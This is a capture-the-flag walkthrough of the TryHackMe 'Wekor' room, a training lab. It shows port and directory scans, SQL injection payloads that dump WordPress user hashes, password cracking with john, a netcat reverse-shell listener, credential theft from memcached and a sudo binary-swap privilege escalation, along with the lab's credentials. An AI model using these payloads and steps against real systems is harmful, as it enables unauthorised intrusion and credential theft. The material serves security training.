# Wekor

**Room Link:** [https://tryhackme.com/room/wekorra](https://tryhackme.com/room/wekorra)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (700).png" alt=""><figcaption></figcaption></figure>





## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (701).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```







<figure><img src="../../.gitbook/assets/image (702).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
gobuster dir -u $VICTIM/workshop/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



**Kali**

```
gobuster dir -u $VICTIM/root/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

**Kali**

```
gobuster dir -u $VICTIM/lol/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



**Kali**

```
gobuster dir -u $VICTIM/agent/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



**Kali**

```
gobuster dir -u $VICTIM/feed/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



**Kali**

```
gobuster dir -u $VICTIM/crawler/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



**Kali**

```
gobuster dir -u $VICTIM/boot/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



**Kali**

```
gobuster dir -u $VICTIM/comingreallysoon/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



**Kali**

```
gobuster dir -u $VICTIM/interesting/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```









<figure><img src="../../.gitbook/assets/image (703).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (704).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (705).png" alt=""><figcaption></figcaption></figure>

Save request into a file

<figure><img src="../../.gitbook/assets/image (706).png" alt=""><figcaption></figcaption></figure>







## SQL Injection



<figure><img src="../../.gitbook/assets/image (707).png" alt=""><figcaption></figcaption></figure>

**List**

```
'
"
`
')
")
`)
'))
"))
`))
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 4--+
1' GROUP BY 1--+
1' GROUP BY 2--+
1' GROUP BY 3--+
1' GROUP BY 4--+
1' UNION SELECT null-- -
1' UNION SELECT null,null-- -
1' UNION SELECT null,null,null-- -
1' UNION SELECT null,null,null,null-- -
1' UNION SELECT null,null,null,null,null-- -
```

<figure><img src="../../.gitbook/assets/image (708).png" alt=""><figcaption></figcaption></figure>

Get version

**Sql**

```
1'%20UNION%20SELECT%20null,null,VERSION()--%20
```



<figure><img src="../../.gitbook/assets/image (709).png" alt=""><figcaption></figcaption></figure>

Display all database names

**Sql**

```
1'%20UNION%20SELECT%20null,null,table_schema from information_schema.columns--%20
```



<figure><img src="../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>

Display tables inside wordpress database

**Sql**

```
1'%20UNION%20SELECT%20null,null,concat(table_name) from information_schema.columns where table_schema='wordpress'--%20
```

<figure><img src="../../.gitbook/assets/image (711).png" alt=""><figcaption></figcaption></figure>

Display all columns of wp\_users table

**Sql**

```
1'%20UNION%20SELECT%20null,null,concat(column_name) from information_schema.columns where table_schema='wordpress'and table_name='wp_users' --%20
```

<figure><img src="../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>

Display results of userlogin, user\_pass, and user\_activation\_key columns

**Sql**

```
1'%20UNION%20SELECT%20concat(user_login),concat(user_pass),concat(user_activation_key) from wordpress.wp_users--%20
```

<figure><img src="../../.gitbook/assets/image (715).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>

We have some credentials but they don't work for SSH. So there is info we are missing

**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john  hash.txt --show
```

<figure><img src="../../.gitbook/assets/image (717).png" alt=""><figcaption></figcaption></figure>

**Sql**

```
1'%20UNION%20SELECT%20concat(user_url),concat(user_email),concat(user_nicename) from wordpress.wp_users--%20
```

<figure><img src="../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (719).png" alt=""><figcaption></figcaption></figure>

I added just the wekor site since the others are .com sites so I doubt they are being used.

<figure><img src="../../.gitbook/assets/image (720).png" alt=""><figcaption></figcaption></figure>

We can see the site

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

We can login with all accounts but yura is a admin

**Credentials**

```
Username: wp_yura
Password: soccer13
```

<figure><img src="../../.gitbook/assets/image (723).png" alt=""><figcaption></figcaption></figure>





## Initial Shell

<figure><img src="../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1337
```

<figure><img src="../../.gitbook/assets/image (726).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (727).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



**Victim**

```
ss -ltp
```

<figure><img src="../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

## TCP/11211 - Memcache&#x20;

**Victim**

```
cd /usr/share/memcached/scripts/  
./memcached-tool localhost:1121 dump
```

<figure><img src="../../.gitbook/assets/image (729).png" alt=""><figcaption></figcaption></figure>



## Lateral Movement&#x20;

I couldn't ssh into the host but could su from www-data

**Victim**

```
su Orka
Password: OrkAiSC00L24/7$
```



## Privilege Escalation&#x20;

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (730).png" alt=""><figcaption></figcaption></figure>

I couldn't really do anything with the bitcoin application itself but I could move the folder desktop and then replace the bitcoin with bash

**Victim**

```
cd /home/Orka
mv Desktop/ bakup
mkdir Desktop
cp /bin/bash Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin 
```

<figure><img src="../../.gitbook/assets/image (731).png" alt=""><figcaption></figcaption></figure>















